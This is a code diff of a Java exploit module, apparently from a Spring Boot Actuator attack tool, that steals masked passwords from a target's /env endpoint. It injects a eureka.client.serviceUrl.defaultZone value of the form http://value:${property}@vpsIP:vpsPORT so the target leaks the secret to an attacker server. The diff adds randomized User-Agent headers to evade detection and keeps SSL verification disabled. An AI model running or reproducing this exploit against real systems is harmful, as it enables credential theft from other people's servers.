@@ -1,10 +1,12 @@
 package src.main.module;
 
+import src.main.common.UA_Config;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -32,10 +34,15 @@ public class GetSpPassWord_II {
         String llib1 = "spring-cloud-starter-netflix-eureka-client";
         String expdata = "eureka.client.serviceUrl.defaultZone=http://value:${%s}@%s";
         String data = String.format(expdata,args,vpsIP+":"+vpsPORT);
+        String ua = "";
         disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -58,6 +65,8 @@ public class GetSpPassWord_II {
                     callback.onResult(text);
                     URL obj1 = new URL(site);
                     HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    ua = uacf.getRandomUserAgent(ualist);
+                    conn1.setRequestProperty("User-Agent",ua);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                     conn1.setDoOutput(true);
@@ -69,6 +78,8 @@ public class GetSpPassWord_II {
                     if (responseCode1 == HttpURLConnection.HTTP_OK) {
                         URL obj2 = new URL(refsite);
                         HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                        ua = uacf.getRandomUserAgent(ualist);
+                        conn2.setRequestProperty("User-Agent",ua);
                         conn2.setRequestMethod("POST");
                         conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                         int responseCode2 = conn2.getResponseCode();
@@ -102,10 +113,15 @@ public class GetSpPassWord_II {
         String llib1 = "spring-cloud-starter-netflix-eureka-client";
         String expdata = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${%s}@%s\"}";
         String data = String.format(expdata,args,vpsIP+":"+vpsPORT);
+        String ua = "";
         disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -128,8 +144,10 @@ public class GetSpPassWord_II {
                     callback.onResult(text);
                     URL obj1 = new URL(site);
                     HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    ua = uacf.getRandomUserAgent(ualist);
+                    conn1.setRequestProperty("User-Agent",ua);
                     conn1.setRequestMethod("POST");
-                    conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                    conn1.setRequestProperty("Content-Type", "application/application/json");
                     conn1.setDoOutput(true);
                     try (OutputStream os = conn1.getOutputStream()) {
                         byte[] input = data.getBytes(StandardCharsets.UTF_8);
@@ -139,6 +157,8 @@ public class GetSpPassWord_II {
                     if (responseCode1 == HttpURLConnection.HTTP_OK) {
                         URL obj2 = new URL(refsite);
                         HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                        ua = uacf.getRandomUserAgent(ualist);
+                        conn2.setRequestProperty("User-Agent",ua);
                         conn2.setRequestMethod("POST");
                         conn2.setRequestProperty("Content-Type", "application/json");
                         int responseCode2 = conn2.getResponseCode();
@@ -154,7 +174,7 @@ public class GetSpPassWord_II {
                         callback.onResult(text);
                     }
                 }else{
-                    text = "发送请求失败！";
+                    text = "未匹配到所需依赖！";
                     callback.onResult(text);
                 }
             }
@@ -168,19 +188,27 @@ public class GetSpPassWord_II {
         // Result1 3 为 sp1
         // Result2 4 为 sp2
         String site = address + "/env";
+        String ua  = "";
         disableSSLVerification();
         URL obj = new URL(site);
         HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+        UA_Config uacf = new UA_Config();
+        List<String> ualist = uacf.loadUserAgents();
+        ua = uacf.getRandomUserAgent(ualist);
+        conn.setRequestProperty("User-Agent",ua);
         conn.setRequestMethod("GET");
         int responseCode = conn.getResponseCode();
         if (responseCode == HttpURLConnection.HTTP_OK){
-            callback.onResult("当前版本为springboot1");
+            text = "当前版本为springboot1";
+            callback.onResult(text);
             Result1(callback);
         }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
-            callback.onResult("当前版本为springboot2");
+            text = "当前版本为springboot2";
+            callback.onResult(text);
             Result2(callback);
         }else{
-            callback.onResult("无法确认springboot版本，请重试");
+            text = "无法确认springboot版本，请重试";
+            callback.onResult(text);
         }
     }
 }
